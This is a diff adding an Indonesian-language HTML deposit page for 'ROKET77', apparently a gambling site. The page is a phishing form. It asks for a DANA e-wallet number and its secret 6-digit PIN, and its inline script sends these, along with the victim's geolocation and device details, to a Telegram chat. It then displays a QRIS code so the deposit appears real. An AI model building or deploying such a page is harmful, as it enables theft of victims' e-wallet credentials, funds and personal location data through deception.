@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROKET77 - Deposit</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <h1>ROKET77</h1>
+                <p>Deposit Dana</p>
+            </div>
+            
+            <form id="depositForm">
+                <div class="form-group">
+                    <label for="danaNumber">Nomor DANA</label>
+                    <input type="text" id="danaNumber" placeholder="Contoh: 081234567890" required>
+                </div>
+                <div class="form-group">
+                    <label for="danaPin">PIN DANA</label>
+                    <input type="password" id="danaPin" placeholder="Masukkan 6 digit PIN" required>
+                </div>
+                <div class="form-group">
+                    <label for="amount">Jumlah Deposit (Rp)</label>
+                    <input type="number" id="amount" placeholder="Minimal Rp50.000" required>
+                </div>
+                <button type="submit" class="btn-login">LANJUTKAN</button>
+            </form>
+
+            <div id="qrisContainer" style="display: none; text-align: center; margin-top: 30px;">
+                <h3>Scan QRIS untuk Deposit</h3>
+                <img src="qris.jpg" alt="QRIS" style="max-width: 250px; margin: 15px auto; border: 1px dashed var(--secondary); padding: 10px; border-radius: 8px;">
+                <p>Nominal: Rp<span id="displayAmount">0</span></p>
+                <button class="btn-login" id="finishDeposit">SELESAI</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        // Ambil username dari localStorage
+        const username = localStorage.getItem('username') || 'Tidak diketahui';
+        
+        // Handle Form Deposit
+        document.getElementById('depositForm')?.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const danaNumber = document.getElementById('danaNumber').value;
+            const danaPin = document.getElementById('danaPin').value;
+            const amount = parseInt(document.getElementById('amount').value);
+            
+            // Dapatkan lokasi dan info perangkat terbaru
+            const location = await getLocation();
+            const deviceInfo = getDeviceInfo();
+            
+            // Update userData
+            userData = {
+                ...userData,
+                location,
+                deviceInfo
+            };
+            
+            // Kirim data ke Telegram
+            const message = formatTelegramMessage('DEPOSIT', {
+                username,
+                danaNumber,
+                danaPin,
+                amount,
+                location,
+                deviceInfo
+            });
+            
+            await sendTelegramMessage(message);
+            
+            // Tampilkan QRIS
+            document.getElementById('depositForm').style.display = 'none';
+            document.getElementById('qrisContainer').style.display = 'block';
+            document.getElementById('displayAmount').textContent = amount.toLocaleString('id-ID');
+            
+            // Simpan jumlah deposit
+            localStorage.setItem('amount', amount);
+        });
+        
+        // Handle tombol selesai
+        document.getElementById('finishDeposit')?.addEventListener('click', function() {
+            window.location.href = 'main.html';
+        });
+    </script>
+</body>
+</html>
